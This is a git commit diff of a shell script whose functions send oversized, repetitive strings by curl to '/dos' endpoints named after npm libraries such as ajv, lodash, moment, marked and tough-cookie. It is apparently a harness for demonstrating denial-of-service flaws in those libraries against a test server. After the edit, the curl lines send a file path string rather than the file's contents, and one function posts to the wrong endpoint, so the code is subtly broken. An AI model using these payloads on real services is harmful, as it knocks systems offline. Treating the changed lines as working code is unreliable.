2ccf7e797c9704b11930b1b4a85b230a91b7b1ec
Thomas Collyer <collyert@live.co.uk>
2020-03-31 19:13:32 +0100

    updated data paths for utils

--- utils.sh
+++ utils.sh
@@ -26,71 +26,49 @@ makeJson() {
 }
 
 runAjvDos() {
-    fin="$(generate 10000 "if(")x$(generate 10000 ")")"
-    makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/ajv/dos
+    curl -d "../data/runajvdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/ajv/dos
 }
 
 runCharsetDos() {
-    fin="$(generate 40000 ` `)"
-    makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/charset/dos
+    curl -d "../data/charsetdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/charset/dos
 }
 
 runContentTypeParserDos() {
-    fin="$(generate 30000 "/")"
-    makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/content-type-parser/dos
+    curl -d "../data/contenttypeparserdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/content-type-parser/dos
 }
 
 runContentDos() {
-    fin="$(generate 2000 " ")"
-    makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/content/dos
+    curl -d "../data/contentdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/content/dos
 }
 
 runDebugDos() {
-    fin="$(generate 40000 ' ')"
-    makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/debug/dos
+    curl -d "../data/debugdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/debug/dos
 }
 
 runDnsSyncDos() {
-    fin="$(generate 40 "a")"
-    makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/dns-sync/dos
+    curl -d "../data/dnssyncdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/dns-sync/dos
 }
 
 runForwardedDos() {
-    fin="$(generate 60000 ' ')"
-    makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/dns-sync/dos
+    curl -d "../data/forwardeddosdata.json" -H "Content-Type: application/json" -X POST ${URL}/dns-sync/dos
 }
 
 runFreshDos() {
-    fin="$(generate 60000 ' ')"
-    makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/fresh/dos
+    curl -d "../data/freshdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/fresh/dos
 }
 
 runHtmlParserDos() {
-    fin="$(generate 50000 " ")"
-    makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/htmlparser/dos
+    curl -d "../data/htmlparserdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/htmlparser/dos
 }
 
 runIsMobileJsDos() {
-    fin="$(generate 20000 "X")"
-    makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/ismobilejs/dos
+    curl -d "../data/mobilejsdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/ismobilejs/dos
 }
 
 runLodashDos() {
-    fin="$(generate 80000 "A")"
-    makeJson $fin
     echo "Attempting POST request"
     start=`date +%s`
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/lodash/dos
+    curl -d "../data/lodashdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/lodash/dos
     echo ""
     echo "POST request complete: "
     end=`date +%s`
@@ -101,71 +79,71 @@ runLodashDos() {
 runMimeDos(){
     fin="$(generate 81750 "5")"
     makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/mime/dos
+    curl -d "../data/mimedosdata.json" -H "Content-Type: application/json" -X POST ${URL}/mime/dos
 }
 
 runMobileDetectDos(){
     fin="$(generate 12500 "Dell")"
     makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/mobile_detect/dos
+    curl -d "../data/mobiledetectdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/mobile_detect/dos
 }
 
 runMomentDos(){
     fin="$(generate 50000 "1")"
     makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/moment/dos
+    curl -d "../data/momentdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/moment/dos
 }
 
 runNoCaseDos(){
     fin="$(generate 50000 "X")"
     makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/no_case/dos
+    curl -d "../data/nocasedosdata.json" -H "Content-Type: application/json" -X POST ${URL}/no_case/dos
 }
 
 runParsejsonDos(){
     fin="$(generate 50000 " ")"
     makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/parsejson/dos
+    curl -d "../data/parsejsondosdata.json" -H "Content-Type: application/json" -X POST ${URL}/parsejson/dos
 }
 
 runPlatformDos(){
     fin="$(generate 30000 " ")"
     makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/platform/dos
+    curl -d "../data/platformdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/platform/dos
 }
 
 runSlugDos(){
     fin="$(generate 50000 " ")"
     makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/slug/dos
+    curl -d "../data/slugdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/slug/dos
 }
 
 runStringDos(){
     fin="$(generate 50000 "9")"
     makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/string/dos
+    curl -d "../data/stringdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/string/dos
 }
 
 runToughCookieDos(){
     fin="$(generate 50000 " ")"
     makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/tough_cookie/dos
+    curl -d "../data/toughcookiedosdata.json" -H "Content-Type: application/json" -X POST ${URL}/tough_cookie/dos
 }
 
 runTimespanDos(){
     fin="$(generate 30000 "1")"
     makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/timespan/dos
+    curl -d "../data/timespandosdata.json" -H "Content-Type: application/json" -X POST ${URL}/timespan/dos
 }
 
 runUnderscoreStringDos(){
     fin="$(generate 50000 "&")"
     makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/underscore_string/dos
+    curl -d "../data/underscorestringdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/underscore_string/dos
 }
 #how do I generate multiple text?
 runMarkedDos() {
     fin="$(generate 8 "\`")$(generate 700 " ")$(generate 11 "\`")"
     makeJson $fin
-    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/marked/dos
+    curl -d "../data/markeddosdata.json" -H "Content-Type: application/json" -X POST ${URL}/marked/dos
 }
